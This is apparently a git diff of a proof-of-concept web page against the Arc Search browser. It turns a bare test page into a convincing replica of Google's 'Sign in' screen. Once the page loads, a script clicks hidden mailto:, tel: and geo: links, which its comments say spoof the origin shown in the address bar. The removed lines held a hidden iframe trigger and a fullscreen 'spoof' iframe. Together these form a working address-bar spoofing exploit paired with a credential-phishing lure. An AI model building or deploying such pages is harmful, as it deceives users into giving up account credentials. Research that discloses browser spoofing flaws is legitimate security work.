@@ -3,24 +3,113 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoC</title>
+  <title>Sign in – Google Accounts</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 24px;
+      min-height: 100vh;
+    }
+    .logo { margin-bottom: 32px; }
+    .card {
+      width: 100%;
+      max-width: 380px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 36px 36px 28px;
+    }
+    h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
+    .sub { font-size: 16px; color: #202124; text-align: center; margin-bottom: 28px; }
+    input {
+      width: 100%; padding: 14px 12px;
+      border: 1px solid #dadce0; border-radius: 4px;
+      font-size: 16px; margin-bottom: 20px; outline: none;
+    }
+    input:focus { border-color: #1a73e8; border-width: 2px; }
+    .hint { font-size: 13px; color: #202124; margin-bottom: 24px; line-height: 1.5; }
+    .hint a { color: #1a73e8; text-decoration: none; }
+    .row { display: flex; justify-content: space-between; align-items: center; }
+    .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
+    .next {
+      background: #1a73e8; color: #fff;
+      border: none; border-radius: 4px;
+      padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
+    }
+  </style>
 </head>
 <body>
- 
-<!-- Hidden attacker iframe that triggers URI scheme nav -->
-<iframe id="attack-frame" style="display:none;width:1px;height:1px;" srcdoc="
-  <script>
-    setTimeout(function() {
-      try { location.href = 'geo:0,0'; } catch(e) {}
-    }, 50);
-  </script>
-"></iframe>
- 
-<!-- Fullscreen victim iframe -->
-<iframe id="victim-frame"
-  src="agungtay81.github.io/spoof/arc.html"
-  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;"
-></iframe>
- 
+
+<div class="logo">
+  <!-- Google logo SVG -->
+  <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+    <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+    <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+    <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+    <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+    <path fill="#4285F4" d="M35.29 41.41V32h32.6c.32 1.68.48 3.67.48 5.83 0 7.23-1.98 16.14-8.36 22.52-6.21 6.46-14.15 9.91-24.72 9.91C16.24 70.26.85 55.5.85 36.26.85 17.02 16.24 2.26 35.29 2.26c10.83 0 18.55 4.25 24.35 9.74l-6.85 6.85c-4.16-3.89-9.82-6.93-17.5-6.93-14.31 0-25.49 11.51-25.49 25.82 0 14.31 11.18 25.82 25.49 25.82 9.28 0 14.56-3.73 17.95-7.12 2.75-2.75 4.56-6.69 5.27-12.06l-23.22.02z"/>
+  </svg>
+</div>
+
+<div class="card">
+  <h1>Sign in</h1>
+  <p class="sub">to continue to Google</p>
+  <input type="email" placeholder="Email or phone">
+  <p class="hint">
+    Not your computer? Use Guest mode to sign in privately.
+    <a href="#">Learn more</a>
+  </p>
+  <div class="row">
+    <a href="#" class="create">Create account</a>
+    <button class="next">Next</button>
+  </div>
+</div>
+
+<script>
+  // THIS is the key trigger — fires from domain B (intanjelek.github.io) origin
+  // Arc Search Navigation Delegate will read THIS page's origin for the address bar
+
+  function triggerNav() {
+    var schemes = [
+      'mailto:spoof@example.com',  // most common, least disruptive
+      'tel:+1234567890',
+      'geo:0,0'
+    ];
+
+    var i = 0;
+    function tryNext() {
+      if (i >= schemes.length) return;
+      try {
+        // Use anchor click — cleaner than location.href, less likely to navigate away
+        var a = document.createElement('a');
+        a.href = schemes[i];
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch(e) {}
+      i++;
+      // Try each scheme 200ms apart
+      setTimeout(tryNext, 200);
+    }
+
+    tryNext();
+  }
+
+  // Fire after page renders (not too early)
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(triggerNav, 100);
+    });
+  } else {
+    setTimeout(triggerNav, 100);
+  }
+</script>
+
 </body>
 </html>
